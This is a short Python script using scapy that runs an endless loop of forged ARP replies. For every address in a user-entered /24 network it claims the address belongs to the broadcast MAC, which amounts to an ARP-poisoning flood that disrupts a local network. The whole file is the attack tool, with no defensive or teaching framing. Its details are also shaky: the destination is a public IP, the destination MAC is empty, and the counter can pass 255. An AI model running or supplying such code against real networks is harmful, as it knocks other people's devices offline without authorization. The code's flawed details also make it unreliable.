from scapy.all import Ether, srp, ARP, send
        
print("8.8.8.8/24 -> 8.8.8.")
targetip = input("network : ")
i = 0
while (True):
    ip = targetip + str(i)
    send(ARP(op=2, psrc=ip, pdst="8.8.8.8", hwdst="", hwsrc="ff:ff:ff:ff:ff:ff"), verbose=0)
    if (i > 255):
        i = 0
    i += 1
